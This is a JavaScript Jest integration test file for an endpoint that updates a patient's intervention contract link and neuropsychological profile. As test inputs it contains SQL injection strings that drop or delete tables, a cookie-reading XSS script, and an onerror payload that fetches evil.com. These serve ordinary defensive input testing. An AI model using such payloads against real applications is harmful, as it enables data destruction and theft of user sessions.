const request = require('supertest');

// ===================== MOCKS =============================================

let mockAuthBehavior = 'authenticated';

jest.mock('../../../Back/src/infrastructure/auth/auth.middleware', () =>
  jest.fn(() => ({
    verifyToken: (req, res, next) => {
      if (mockAuthBehavior === 'unauthenticated') {
        return res.redirect('/auth/');
      }
      req.user = { id: 1, role: 'admin' };
      next();
    },
  }))
);

jest.mock('../../../Back/src/infrastructure/auth/permissions.middleware', () =>
  jest.fn(() => ({
    requirePermission: () => (req, res, next) => next(),
  }))
);

jest.mock('../../../Back/src/infrastructure/external/rateLimiting', () => ({
  loginLimiter:      (req, res, next) => next(),
  generalLimiter:    (req, res, next) => next(),
  apiLimiter:        (req, res, next) => next(),
  publicationLimiter:(req, res, next) => next(),
}));

const mockExecuteUpdate = jest.fn();

jest.mock('../../../Back/src/application/usecase/interventions/updateContractUseCase', () =>
  jest.fn().mockImplementation(() => ({ execute: mockExecuteUpdate }))
);

const app = require('../../../Back/src/app');

afterAll(async () => { await app.close?.(); });

// ===================== HELPERS ===========================================

const asAuthenticated   = () => { mockAuthBehavior = 'authenticated'; };
const asUnauthenticated = () => { mockAuthBehavior = 'unauthenticated'; };

const validBody = () => ({
  contract_link : 'https://example.com/contract.pdf',
  neuro_profile : 'Initial neuropsychological profile of the patient.',
});

// ===================== TESTS =============================================

describe('INTEGRATION — PATCH /users/:id_user/intervention · contract_link (cases 2.x)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    asAuthenticated();
  });

  test('base — responds 200 with valid data', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send(validBody());

    expect(res.status).toBe(200);
  });

  // 2.1 — No router-level validation on contract_link; data-URIs pass through as plain strings (200).
  test('2.1 accepts an image data-URI in contract_link as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), contract_link: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA' });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');
  });

  // 2.2 — SQL passes through as plain string (200); parameterised queries prevent injection.
  test('2.2 accepts SQL injection in contract_link as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), contract_link: "' OR '1'='1; DROP TABLE intervention; --" });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('DROP');
    expect(res.text).not.toContain('stack');
  });

  // 2.4 — XSS passes through as plain string (200); neutralised at render time via EJS escaping.
  test('2.4 accepts an XSS payload in contract_link as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), contract_link: '<script>alert(document.cookie)</script>' });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('<script>');
    expect(res.text).not.toContain('stack');
  });

  // 2.5 — Emojis pass through as plain string (200).
  test('2.5 accepts emojis in contract_link as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), contract_link: 'https://example.com/🎉🚀' });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');
  });
});

// =======================================================================

describe('INTEGRATION — PATCH /users/:id_user/intervention · neuro_profile (cases 3.x)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    asAuthenticated();
  });

  // 3.1 — neuro_profile is free-text; data-URIs pass through as plain strings (200).
  test('3.1 accepts an image data-URI in neuro_profile as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD' });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');
  });

  // 3.2 — SQL passes through as plain string (200); parameterised queries prevent injection.
  test('3.2 accepts SQL injection in neuro_profile as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: "'; DELETE FROM users; --" });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('DELETE');
    expect(res.text).not.toContain('stack');
  });

  // 3.5 — XSS passes through as plain string (200); neutralised at render time via EJS escaping.
  test('3.5 accepts an XSS payload in neuro_profile as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: '<img src=x onerror="fetch(\'https://evil.com\')">' });

    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');
  });

  // 3.6 — Emojis: accepted (200) or sanitised (400).
  test('3.6 handles emojis in neuro_profile without internal errors', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: 'Profile with emojis 😊🧠✅' });

    expect([200, 400]).toContain(res.status);
    expect(res.text).not.toContain('stack');
  });

  test('redirects to /auth/ when there is no active session', async () => {
    asUnauthenticated();

    const res = await request(app)
      .patch('/users/1/intervention')
      .send(validBody());

    expect(res.status).toBe(302);
    expect(res.header.location).toBe('/auth/');
  });
});